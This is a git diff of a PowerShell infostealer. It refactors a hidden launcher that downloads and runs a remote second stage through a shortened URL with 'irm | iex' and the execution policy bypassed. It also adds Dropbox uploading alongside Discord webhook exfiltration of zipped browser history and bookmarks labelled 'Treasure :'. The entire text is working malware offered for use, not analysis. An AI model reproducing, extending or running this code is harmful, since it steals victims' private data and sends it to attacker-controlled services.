@@ -5,7 +5,8 @@ Stage2 url :
                     https://shorturl.at/fiZ38
 
 Invoke powershell + stage 2 into it + be furtive : 
-powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name DiscordUrl -Value 'DISCORD_WEBHOOK'; irm https://shorturl.at/fiZ38 | iex}"
+powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name dc -Value 'DISCORD_WEBHOOK'; irm https://shorturl.at/fiZ38 | iex}"
+powershell -w h -NoP -Ep Bypass -Command "& {Set-Variable -Name db -Value 'DROPBOX_TOKEN'; irm https://shorturl.at/fiZ38 | iex}"
 
 #>
 
@@ -21,7 +22,7 @@ function TempDir {
     Set-Location -Path "C:\temp"
 }
 
-function DropBox-Upload {
+function Upload-Dropbox {
 
 [CmdletBinding()]
 param (
@@ -30,11 +31,11 @@ param (
 [Alias("f")]
 [string]$SourceFilePath
 ) 
-$DropBoxAccessToken = "YOUR-DROPBOX-ACCESS-TOKEN-HERE"   # Replace with your DropBox Access Token
+$db = "YOUR-DROPBOX-ACCESS-TOKEN-HERE"   # Replace with your DropBox Access Token
 $outputFile = Split-Path $SourceFilePath -leaf
 $TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
-$authorization = "Bearer " + $DropBoxAccessToken
+$authorization = "Bearer " + $db
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
 $headers.Add("Authorization", $authorization)
 $headers.Add("Dropbox-API-Arg", $arg)
@@ -60,17 +61,17 @@ function Upload-Discord {
     }
 
     if (-not ([string]::IsNullOrEmpty($text))){
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $DiscordUrl -Method Post -Body ($Body | ConvertTo-Json)
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
     }
 
     if (-not ([string]::IsNullOrEmpty($file))){
-        curl.exe -F "file1=@$file" $DiscordUrl
+        curl.exe -F "file1=@$file" $dc
     }
 }
 
 
 # Function to create a zip archive using Compress-Archive and upload to Discord
-function ZipAndUploadToDiscord {
+function ZipFiles {
 
     # Specify the source directory
     $sourceDirectory = "C:\temp"
@@ -88,11 +89,6 @@ function ZipAndUploadToDiscord {
     # Compress the contents of the source directory to a zip file
     Compress-Archive -Path $sourceDirectory -DestinationPath $zipFilePath
 
-    # Call Upload-Discord to send the zip archive to Discord
-    Upload-Discord -file $zipFilePath -text "Treasure :"
-
-    # Cleanup: Remove the zip file
-    Remove-Item -Path $zipFilePath -Force
 }
 
 
@@ -125,8 +121,15 @@ function Exfiltration {
     GrabBrowserData -Browser "chrome" -DataType "bookmarks" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
     GrabBrowserData -Browser "firefox" -DataType "history" | Out-File -Append -FilePath "Br0ws3r_d4t4.txt"
 
-    #Call ZipAndUploadToDiscord
-    ZipAndUploadToDiscord
+    #Call ZipFiles
+    ZipFiles
+
+    # Call Upload-Discord
+    Upload-Discord -file $zipFilePath -text "Treasure :"
+
+    # Call Upload-Dropbox
+    Upload-Dropbox -FileName "file.txt"
+    
 }
 
 function AntiSpywareInfo {
@@ -497,4 +500,4 @@ TempDir
 Exfiltration
 
 # Call DelTempDir
-DelTempDir
+#DelTempDir
